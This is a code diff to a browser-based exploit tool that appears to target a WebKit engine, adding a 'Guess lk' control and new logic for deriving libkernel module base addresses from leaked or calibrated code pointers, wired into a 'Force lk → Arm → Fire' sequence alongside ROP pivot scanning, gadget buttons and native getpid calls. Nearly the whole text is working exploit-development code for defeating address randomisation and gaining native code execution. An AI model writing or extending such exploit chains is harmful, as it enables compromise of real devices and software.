@@ -44,7 +44,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830h";
+const BUILD_ID = "rw-20250830i";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -108,7 +108,7 @@ let raceMode = false;
 const raceBuf = [];
 
 let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
-let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnPeek, btnClear;
+let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
 let g5BarBtns = [];
@@ -215,6 +215,7 @@ function setUi() {
     }
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
     if (btnForceLk) btnForceLk.disabled = busy || !ready;
+    if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
@@ -253,16 +254,36 @@ function alignModuleBase(addr) {
     return new int64(addr.low & ~0x3fff, addr.hi);
 }
 
+/** cal EXT-PTR: c.ptr = code pointer, c.code = prologue magic (NOT subtract for base). */
 function lkBaseFromCalEntry(c) {
     const codePtr = parseAddr(c.ptr);
     if (!codePtr) return null;
-    let rva = 0;
-    if (c.code) {
-        const s = String(c.code).replace(/^0x/i, "");
-        if (/^[0-9a-f]+$/i.test(s)) rva = parseInt(s, 16);
+    return alignModuleBase(codePtr);
+}
+
+function buildCalLkCandidates() {
+    const out = [];
+    const entries = calExtPtrCandidates();
+    for (let i = 0; i < entries.length; i++) {
+        const c = entries[i];
+        const base = lkBaseFromCalEntry(c);
+        if (!base) continue;
+        out.push({
+            label: c.label,
+            code: c.ptr,
+            magic: c.code,
+            base,
+            note: "align4k",
+        });
+        out.push({
+            label: c.label + " −4K",
+            code: c.ptr,
+            magic: c.code,
+            base: base.sub32(0x4000),
+            note: "align4k-4k",
+        });
     }
-    const raw = rva ? codePtr.sub32(rva) : codePtr;
-    return alignModuleBase(raw);
+    return out;
 }
 
 function validateLkBase(lk) {
@@ -335,6 +356,8 @@ const CAL_VTABLE_PTRS = [
 ];
 const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
 let calPtrIdx = 0;
+let guessLkIdx = 0;
+let calLkCands = null;
 
 function parseCalPtr(raw) {
     const s = String(raw).replace(/^0x/i, "").trim();
@@ -1784,36 +1807,52 @@ let leakScanState = null;
 
 function runTryCalPtrs() {
     if (!ready || busy) return;
-    const { webkitBase } = basesFromSession(loadEffectiveOff());
-    if (!webkitBase) {
-        mark("LK-SKIP", "no webkitBase — Save bases first");
-        return;
-    }
-    const cands = CAL_VTABLE_PTRS;
-    if (calPtrIdx >= cands.length) {
+    if (!calLkCands) calLkCands = buildCalLkCandidates();
+    if (calPtrIdx >= calLkCands.length) {
         calPtrIdx = 0;
-        mark("LK-CAL-DONE", "cycle reset — tried all " + cands.length);
+        mark("LK-CAL-DONE", "cycle reset — tried all " + calLkCands.length + " bases");
         renderOut();
         return;
     }
-    const c = cands[calPtrIdx++];
+    const c = calLkCands[calPtrIdx++];
     if (lines.length > 32) lines.splice(0, lines.length - 32);
-    const lkBase = lkBaseFromCalEntry(c);
-    if (addrIn && lkBase) addrIn.value = String(lkBase);
+    if (addrIn && c.base) addrIn.value = String(c.base);
     lkQuiet = true;
-    mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + cands.length
-        + " " + c.label + " code=" + c.ptr + " → base=" + lkBase);
-    mark("LK-HINT", "hex has module base — tap Force lk (0 reads), then Arm → Fire");
+    mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + calLkCands.length
+        + " " + c.label + " code=" + c.code + " magic=" + c.magic
+        + " → base=" + c.base + " (" + c.note + ", 0 reads)");
+    mark("LK-HINT", "Force lk → Arm → Fire. Do NOT Paste/peek cal code ptrs (OOM)");
     lkQuiet = false;
     if (outEl) {
         outEl.textContent = lines.join("\n");
         outEl.scrollTop = outEl.scrollHeight;
     }
-    state("loaded " + c.label + " → Force lk", "warn");
+    state("base " + calPtrIdx + "/" + calLkCands.length + " → Force lk", "warn");
     try {
-        crashLog.append("LK-CAL loaded " + c.label + " " + c.ptr, "LK-CAL");
+        crashLog.append("LK-CAL " + c.label + " base=" + c.base, "LK-CAL");
         crashLog.flushSync();
     } catch (_) { }
+}
+
+function runGuessLk() {
+    if (!ready || busy) return;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Start first");
+        return;
+    }
+    const cands = estimateLibkernelCandidates(webkitBase, null);
+    if (!cands.length) {
+        mark("LK-SKIP", "no wk-relative guesses");
+        return;
+    }
+    if (guessLkIdx >= cands.length) guessLkIdx = 0;
+    const c = cands[guessLkIdx++];
+    const hex = c.hex.replace(/^0x/i, "");
+    if (addrIn) addrIn.value = hex;
+    mark("LK-GUESS", c.hex + " (" + c.why + ") 0 reads — Force lk → Arm → Fire");
+    state("wk guess " + guessLkIdx + "/" + cands.length, "warn");
+    renderOut();
 }
 
 async function runLeakLkScan() {
@@ -2515,6 +2554,7 @@ function init() {
     btnNative = $("btn-native");
     btnLoadCal = $("btn-load-cal");
     btnForceLk = $("btn-force-lk");
+    btnGuessLk = $("btn-guess-lk");
     btnVerifyPivot = $("btn-verify-pivot");
     btnScanPivot = $("btn-scan-pivot");
     btnPeek = $("btn-peek");
@@ -2534,8 +2574,9 @@ function init() {
     wireClick(btnVerifyPivot, verifyPivotManual);
     wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
     wireClick(btnNative, function () { return runNativeCall(); });
-    wireClick(btnLoadCal, function () { runManualTest("try-cal-ptrs"); });
+    wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnForceLk, function () { runManualTest("force-lk"); });
+    wireClick(btnGuessLk, function () { runGuessLk(); });
     wireClick(btnClear, function () {
         lines.length = 0;
         clearPersistedLog();
